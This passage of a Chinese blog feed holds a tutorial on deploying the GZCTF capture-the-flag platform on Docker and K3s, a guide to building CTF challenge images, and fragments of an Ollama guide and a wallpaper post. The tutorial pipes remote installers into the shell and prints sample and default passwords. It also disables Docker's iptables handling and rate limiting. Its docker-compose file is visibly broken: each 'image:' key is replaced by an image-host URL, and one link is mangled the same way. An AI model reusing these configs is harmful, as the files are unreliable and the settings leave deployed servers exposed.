title="开始使用"></a>开始使用</h3><p>这个方法有两个使用方式</p><p>第一种是，下载模型完成后即可直接开始对话</p><p>但是cmd命令窗口下对话的内容并不会保存，且无法换行输入（可以复制进去）</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-23.png"></p><p>第二种是在<code>VsCode</code>中使用，我也更推荐该方法，使用前先双击打开<code>ollama</code>软件</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-24.png"></p><p>然后选择模型</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-25.png"></p><p>开始对话</p><p><img src="https://img.beiko.top/blog/2024/9/27/image-26.png"></p><p>本文完~</p>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF动态题目构建</title>
      <link href="/blog/2024/09/26/03/"/>
      <url>/blog/2024/09/26/03/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF动态题目构建"><a href="#CTF动态题目构建" class="headerlink" title="CTF动态题目构建"></a>CTF动态题目构建</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong><font style="color:#DF2A3F;">本教程需要科学上网以及外网VPS</font></strong></p><p>如果选择本地出题或者使用github存储镜像这里推荐一个项目（不保证可用）</p><p><a href="https://github.com/tech-shrimp/docker_installer">GitHub - tech-shrimp/docker_installer: Docker官方安装包，用来解决因国内网络无法安装使用Docker的问题</a></p><p><a href="https://docs.github.com/en/packages/quickstart">Github 创建容器镜像文档</a></p><p>先在 <a href="https://hub.docker.com/">https://hub.docker.com/</a> 注册一个账号</p><p>记住账号和密码</p><p>然后创建一个存储库</p><p><img src="https://img.beiko.top/blog/2024/9/26/image-0.png"></p><p><img src="https://img.beiko.top/blog/2024/9/26/image-1.png"></p><p>在VPS上运行<code>docker login</code>登录账号</p><p><img src="https://img.beiko.top/blog/2024/9/26/image-2.png"></p><p>输入已注册的账号名或邮箱，然后输入密码</p><p>出现<code>Login Succeeded</code>即为登录成功</p><h2 id="出题模板"><a href="#出题模板" class="headerlink" title="出题模板"></a>出题模板</h2><p>根据模板要求放置对应源码和填写配置文件</p><p>参考文章：<a href="https://hello-ctf.com/Create/WebBaseChallenge/">https://hello-ctf.com/Create/WebBaseChallenge/</a></p><p><a href="https://github.com/CTF-Archives/ctf-docker-template">GitHub - CTF-Archives/ctf-docker-template: Deployment template for docker target machine in ctf for CTFd and other platforms that support dynamic flags</a></p><p><a href="https://github.com/qsnctf/qsnctf_base_docker_https://img.beiko.top/blog/2024/9/26/images">GitHub - qsnctf/qsnctf_base_docker_https://img.beiko.top/blog/2024/9/26/images: 青少年CTF基础Docker镜像</a></p><h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><p>直接将项目文件放入 模板中的 <code>./src</code> 目录中即可</p><p>然后执行<code>docker build -t 注册的用户名/仓库名:标签 .</code></p><p>例如</p><p><code>docker build -t beik0/mewiphgcgt:web3 .</code></p><p>即可开始构建镜像</p><p>构建完成后</p><p><code>docker push beik0/mewiphgcgt:web3</code></p><p>上传镜像文件到 <a href="https://hub.docker.com/">https://hub.docker.com/</a></p><p>然后执行<code>docker push 注册的用户名/仓库名:标签</code></p><p>例如</p><p><code>docker push beik0/mewiphgcgt:web1</code></p><p><img src="https://img.beiko.top/blog/2024/9/26/image-3.png"></p><p>出现<code>sha256:xxxxx</code>证明上传成功</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>cd ./docker</p><p>docker-compose up -d</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GZCTF 开源平台部署</title>
      <link href="/blog/2024/09/25/GZCTF/"/>
      <url>/blog/2024/09/25/GZCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-K3s-分离部署"><a href="#Docker-K3s-分离部署" class="headerlink" title="Docker + K3s 分离部署"></a>Docker + K3s 分离部署</h2><p>实际上也可以单台服务器部署所有环境，但最好的就是K3s与GZCTF分离成两个服务器进行部署</p><p>本文章参考官方文档：<a href="https://docs.ctf.gzti.me/zh/quick-start">https://docs.ctf.gzti.me/zh/quick-start</a></p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>接下来的教程均以 Ubuntu 22.04.3 （其他的发行版也可以）进行演示</p><p>VPS-1：GZCTF平台+Kuboard - 192.168.3.12</p><p>VPS-2：K3s集群环境 - 192.168.3.13</p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><h3 id="VPS-1-192-168-3-12"><a href="#VPS-1-192-168-3-12" class="headerlink" title="VPS-1 - 192.168.3.12"></a>VPS-1 - 192.168.3.12</h3><h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><p>安装 <code>sudo apt install docker.io</code></p><p>测试 <code>docker -v</code></p><p>出现以下版本号信息即为安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-1.png"></p><h3 id="VPS-2-192-168-3-13"><a href="#VPS-2-192-168-3-13" class="headerlink" title="VPS-2 - 192.168.3.13"></a>VPS-2 - 192.168.3.13</h3><h4 id="K3s"><a href="#K3s" class="headerlink" title="K3s"></a>K3s</h4><p>k3s 是一个轻量级的 k8s 发行版，可以在单机和多机上快速部署 k8s 集群</p><p>官网文档地址：<a href="https://docs.k3s.io/zh">https://docs.k3s.io/zh</a></p><p>安装命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sfL https://get.k3s.io | sh -</span><br><span class="line"><span class="comment"># 检查就绪节点，大约需要30秒</span></span><br><span class="line">sudo k3s kubectl get node</span><br></pre></td></tr></table></figure><p>中国用户，可以使用以下方法加速安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -</span><br></pre></td></tr></table></figure><p>多机安装和集群组建请参考 <a href="https://docs.k3s.io/zh/quick-start">官方文档</a></p><p>测试 <code>k3s -v</code></p><p>出现如下版本信息即为安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-0.png"></p><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><p>下载最新版的docker-compose文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/v2.27.0/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>如果出现以下错误则安装curl后再运行一次上面的代码</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-2.png"></p><p><code>sudo apt-get install curl</code></p><p><font style="color:rgb(51, 51, 51);">添加可执行权限</font></p><p><code>sudo chmod +x /usr/local/bin/docker-compose</code></p><p>测试 <code>docker-compose --version</code></p><p>出现如下版本信息即为安装成功</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-3.png"></p><h2 id="Kuboard可视化面板"><a href="#Kuboard可视化面板" class="headerlink" title="Kuboard可视化面板"></a>Kuboard可视化面板</h2><p>此面板只是方便管理K3s集群，可以选择不装，不装请直接跳转到下面的配置文件步骤</p><p>在下面的配置中，第四行的<code>端口示例3271</code>要与第六行<code>IP地址后的端口</code>一致</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --restart=unless-stopped \</span><br><span class="line">  --name=kuboard \</span><br><span class="line">  -p 3271:80/tcp \</span><br><span class="line">  -p 10081:10081/tcp \</span><br><span class="line">  -e KUBOARD_ENDPOINT=<span class="string">&quot;http://192.168.3.13:3271&quot;</span> \</span><br><span class="line">  -e KUBOARD_AGENT_SERVER_TCP_PORT=<span class="string">&quot;10081&quot;</span> \</span><br><span class="line">  -v /root/kuboard-data:/data \</span><br><span class="line">  swr.cn-east-2.myhuaweicloud.com/kuboard/kuboard:v3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>docker创建完后，访问<code>http://192.168.3.12:3271</code>即可看到管理面板</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-4.png"></p><p>默认账号：<code>admin</code></p><p>默认密码：<code>Kuboard123</code></p><p><strong>如果是生产环境，登录后请及时更改密码</strong></p><p><img src="https://img.beiko.top/blog/2024/9/25/image-5.png"></p><h3 id="绑定集群"><a href="#绑定集群" class="headerlink" title="绑定集群"></a>绑定集群</h3><p>使用第二种方法<br><img src="https://img.beiko.top/blog/2024/9/25/image-6.png"></p><p><code>kubeconfig</code>获取方法是在安装好<code>K3s</code>的机器上执行</p><p><code>cat /etc/rancher/k3s/k3s.yaml</code></p><p>然后把内容全部复制到图片上的<code>kubeconfig</code>中</p><p>然后把<code>ApiServer 地址</code>改为<code>192.168.3.13</code>即可</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-7.png"></p><h2 id="填写配置文件"><a href="#填写配置文件" class="headerlink" title="填写配置文件"></a>填写配置文件</h2><p>运行以下命令创建配置文件（配置文件的位置可以随意更改）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /GZCTF</span><br><span class="line"><span class="built_in">cd</span> /GZCTF</span><br><span class="line"><span class="built_in">touch</span> appsettings.json</span><br><span class="line"><span class="built_in">touch</span> docker-compose.yml</span><br><span class="line"><span class="built_in">touch</span> kube-config.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="appsettings-json"><a href="#appsettings-json" class="headerlink" title="appsettings.json"></a><code>appsettings.json</code></h3><p><strong><font style="color:#DF2A3F;">注：保存该配置文件前请把注释全部删除</font></strong></p><p>更多配置请看<a href="https://docs.ctf.gzti.me/zh/config/appsettings">官方文档</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="comment">// GZ数据库连接信息，通常情况下无需改动</span></span><br><span class="line">      <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=MCndCf26Ki4kp5eR&quot;</span> </span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;SendMailAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 发件人邮箱地址（必填）</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器用户名（必填）</span></span><br><span class="line">      <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器密码（必填）</span></span><br><span class="line">      <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 服务器地址（必填）</span></span><br><span class="line">        <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span>  <span class="comment">// 服务器端口（必填）</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="comment">// 此处配置加密密钥，用于加密数据库中比赛的私钥信息，可为任意长度的任意字符串（必填）</span></span><br><span class="line">      </span><br><span class="line">  <span class="comment">// 此处配置容器后端，为比赛动态创建容器的必填项。</span></span><br><span class="line">    <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kubernetes&quot;</span><span class="punctuation">,</span>  <span class="comment">// 容器后端类型，选Kubernetes</span></span><br><span class="line">      <span class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span>  <span class="comment">// 端口映射类型，可选 Default 或 PlatformProxy</span></span><br><span class="line">      <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 是否开启流量捕获</span></span><br><span class="line">      <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.3.13&quot;</span><span class="punctuation">,</span> <span class="comment">// 容器后端的公网地址，填写K3s的IP地址或域名（必填）</span></span><br><span class="line">      <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 此处配置 Docker Registry 的用户名和密码，用于比赛动态创建容器时拉取镜像的验证，可选项</span></span><br><span class="line">    <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 此处配置是否开启请求频率限制，若开启，将会根据预设规则限制每个 IP 和 API 的请求频率</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 此处配置 Docker Registry 的用户名和密码，用于比赛动态创建容器时拉取镜像的验证，可选项</span></span><br><span class="line">    <span class="attr">&quot;RegistryConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a><code>docker-compose.yml</code></h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.0&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">https://img.beiko.top/blog/2024/9/26/image:</span> <span class="string">gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=Admin@5.2L9Q3&quot;</span> <span class="comment"># Admin管理员密码（必填）</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:8080&quot;</span> <span class="comment"># 对外端口号，前为GZ的外部端口（必填）</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span> <span class="comment"># 这是k8s部署所必需的</span></span><br><span class="line">      <span class="comment"># - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; # 这是docker部署所必需的</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line"> </span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">https://img.beiko.top/blog/2024/9/26/image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=MCndCf26Ki4kp5eR&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><h3 id="kube-config-yaml"><a href="#kube-config-yaml" class="headerlink" title="kube-config.yaml"></a><code>kube-config.yaml</code></h3><p>k3s 的连接配置文件位于 /etc/rancher/k3s/k3s.yaml，可以使用以下命令导出：</p><p><code>sudo cat /etc/rancher/k3s/k3s.yaml</code></p><p>使用如下命令获取 k3s control-panel 所在机器的 IP：</p><p><code>sudo k3s kubectl cluster-info</code></p><p>若显示<code>127.0.0.1</code>则说明 k3s control-panel 就是当前的机器，请使用 <code>ip a</code> 查看当前机器的 IP</p><p>将上述输出的内容保存为 <code>kube-config.yaml</code>，并更改 server 字段为 k3s control-panel 所在机器的 IP，例如</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">      <span class="attr">certificate-authority-data:</span> <span class="comment"># ...</span></span><br><span class="line">      <span class="attr">server:</span> <span class="string">https://192.168.3.13:6443</span> <span class="comment"># 将IP更改为您的k3s控制面板的IP或域</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure><h2 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h2><p>配置完成后输入在配置文件的目录下运行</p><p><code>docker-compose up -d</code></p><p>等程序创建好容器后</p><p>访问<code>192.168.3.12</code>即可</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-8.png"></p><h2 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h2><h3 id="更改-K3s-的容器数量限制"><a href="#更改-K3s-的容器数量限制" class="headerlink" title="更改 K3s 的容器数量限制"></a>更改 K3s 的容器数量限制</h3><p>k3s 默认的容器数量限制为 110，这可能不适用于比赛中的大量小容器</p><p>因此可以根据需要更改 k3s 的容器数量限制</p><p>在 k3s control-panel 所在的机器上执行以下命令：</p><p><code>sudo nano /etc/rancher/k3s/kubelet.config</code></p><p>编辑如下设置中的 <code>maxPods</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kubelet.config.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">KubeletConfiguration</span></span><br><span class="line"><span class="attr">maxPods:</span> <span class="number">500</span></span><br></pre></td></tr></table></figure><p><code>sudo nano /etc/systemd/system/k3s.service</code></p><p>编辑如下设置中的 <code>ExecStart</code>，指定<code>kubelet-arg</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ExecStart=/usr/local/bin/k3s</span> <span class="string">\</span></span><br><span class="line">    <span class="string">server</span> <span class="string">\</span></span><br><span class="line">    <span class="string">--kubelet-arg=config=/etc/rancher/k3s/kubelet.config</span></span><br></pre></td></tr></table></figure><p>重启K3s即可</p><p><code>sudo systemctl daemon-reload</code></p><p><code>sudo systemctl restart k3s</code></p><h3 id="添加容器镜像仓库"><a href="#添加容器镜像仓库" class="headerlink" title="添加容器镜像仓库"></a>添加容器镜像仓库</h3><p>直接使用外部的容器镜像仓库无法直接在 k3s 中使用，需要在 k3s 中添加镜像仓库。</p><p>在 <code>k3s control-panel</code> 所在的机器上执行以下命令：</p><p><code>sudo vim /etc/rancher/k3s/registries.yaml</code></p><p>编辑如下设置中的 <code>mirrors</code>，指定你所需要的镜像仓库地址</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mirrors:</span></span><br><span class="line"><span class="attr">&quot;container.ctf.example.com&quot;:</span> <span class="comment"># change this to your registry&#x27;s domain</span></span><br><span class="line"><span class="attr">endpoint:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;https://container.ctf.example.com&quot;</span> <span class="comment"># change this to your registry&#x27;s domain</span></span><br></pre></td></tr></table></figure><p>重启K3s</p><p><code>sudo systemctl restart k3s</code></p><h3 id="解决在docker中系统防火墙无法进行限制访问的问题"><a href="#解决在docker中系统防火墙无法进行限制访问的问题" class="headerlink" title="解决在docker中系统防火墙无法进行限制访问的问题"></a>解决在docker中系统防火墙无法进行限制访问的问题</h3><p><a href="https://blog.csdn.net/qq_43580193/article/details/120222339">https://blog.csdn.net/qq_43580193/article/details/120222339</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加规则</span></span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;experimental&quot;</span> : <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;iptables&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 docker</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="K3s卸载"><a href="#K3s卸载" class="headerlink" title="K3s卸载"></a>K3s卸载</h3><p>运行以下命令即可一键删除K3s</p><p><code>sh /usr/local/bin/k3s-uninstall.sh</code>  </p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="如果K3s拉取镜像时出现以下问题"><a href="#如果K3s拉取镜像时出现以下问题" class="headerlink" title="如果K3s拉取镜像时出现以下问题"></a>如果K3s拉取镜像时出现以下问题</h3><p><code>Failed to pull image &quot;docker.io/kubernetesui/metrics-scraper:v1.0.8&quot;: failed to pull and unpack image &quot;docker.io/kubernetesui/metrics-scraper:v1.0.8&quot;: failed to copy: httpReadSeeker: failed open: failed to do request: Get &quot;https://production.cloudflare.docker.com/registry-v2/docker/registry/v2/blobs/sha256/11/115053965e86b2df4d78af78d7951b8644839d20a03820c6df59a261103315f7/data?verify=1720885401-FQ2ec10z9ayDBBbvteS7LWUoZFY%3D&quot;: tls: failed to verify certificate: x509: certificate is valid for *.facebook.com, *.facebook.net, *.fbcdn.net, *.fbsbx.com, *.m.facebook.com, *.messenger.com, *.xx.fbcdn.net, *.xy.fbcdn.net, *.xz.fbcdn.net, facebook.com, messenger.com, not production.cloudflare.docker.com</code></p><p>很简单重启K3s就行了</p><p>重启命令：<code>systemctl restart containerd</code></p><h3 id="如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时"><a href="#如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时" class="headerlink" title="如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时"></a>如果出现容器一开始启动成功，但是几秒后又出现容器未就绪的情况时</h3><p>在GZ平台适当调整一下CPU限制、内存限制、存储限制即可</p><h3 id="如果重启了GZ面板的服务后出现面版无法访问的问题"><a href="#如果重启了GZ面板的服务后出现面版无法访问的问题" class="headerlink" title="如果重启了GZ面板的服务后出现面版无法访问的问题"></a>如果重启了GZ面板的服务后出现面版无法访问的问题</h3><p><strong><font style="color:#DF2A3F;">容器日志显示一直无法连接数据库</font></strong></p><p><img src="https://img.beiko.top/blog/2024/9/25/image-9.png"></p><p>解决方法：</p><p>打开docker配置文件</p><p><img src="https://img.beiko.top/blog/2024/9/25/image-10.png"></p><p>把配置复制删除并保存，然后重启Docker服务，重启后GZ就能访问了</p><p>接着再把配置粘贴进去重启Docker服务，就能解决该问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>壁纸推荐</title>
      <link href="/blog/2022/08/04/bztj/"/>
      <url>/blog/2022/08/04/bztj/</url>
      
        <content type="html"><![CDATA[<h1 id="分享一些好看二次元壁纸"><a href="#分享一些好看二次元壁纸" class="headerlink" title="分享一些好看二次元壁纸"></a>分享一些好看二次元壁纸</h1><h2 id="目前自建图库已经搭建完成，前往观看会有更好的体验（2022-8-30）"><a href="#目前自建图库已经搭建完成，前往观看会有更好的体验（2022-8-30）" class="headerlink" title="目前自建图库已经搭建完成，前往观看会有更好的体验（2022.8.30）"></a>目前自建图库已经搭建完成，<a href="https://www.beiko.top/">前往</a>观看会有更好的体验（2022.8.30）</h2><h3 id="所有图片均为手动筛选和分类，保证图片质量精美"><a href="#所有图片均为手动筛选和分类，保证图片质量精美" class="headerlink" title="所有图片均为手动筛选和分类，保证图片质量精美"></a>所有图片均为手动筛选和分类，保证图片质量精美</h3><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=random' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">随机</div>  <p>点击前往</p>  <a href='https://api.xieweiling.top/?imgtype=random'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=唯美' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">唯美</div>  <p>点击前往</p>  <a href='https://api.xieweiling.top/?imgtype=random&tags=唯美'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=原神' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">原神</div>  <p>点击前往</p>  <a href='https://api.xieweiling.top/?imgtype=random&tags=原神'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=可爱' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">可爱</div>  <p>点击前往</p>  <a 